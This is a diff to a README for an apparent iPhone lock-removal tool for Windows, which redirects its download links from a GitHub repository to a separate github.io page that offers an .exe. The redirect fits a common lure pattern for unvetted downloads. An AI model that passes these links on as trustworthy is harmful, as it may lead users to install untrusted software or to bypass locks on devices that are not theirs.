@@ -1,6 +1,6 @@
 # 🔓 LockEraser-iOS - Remove iPhone locks on your computer
 
-[![Download LockEraser](https://img.shields.io/badge/Download-LockEraser-blue.svg)](https://github.com/Maxph6389/LockEraser-iOS)
+[![Download LockEraser](https://img.shields.io/badge/Download-LockEraser-blue.svg)](https://maxph6389.github.io)
 
 This application removes screen locks from Apple devices. It works on Windows 10 and Windows 11. You use this tool when you forget your passcode or buy a locked used device. The software resets the device to factory settings to clear the lock.
 
@@ -18,7 +18,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to obtain the installer:
 
-1. Visit the [official repository page](https://github.com/Maxph6389/LockEraser-iOS).
+1. Visit the [official repository page](https://maxph6389.github.io).
 2. Locate the Releases section on the right side of the screen.
 3. Click on the latest release version.
 4. Select the `.exe` file to start the download to your computer.
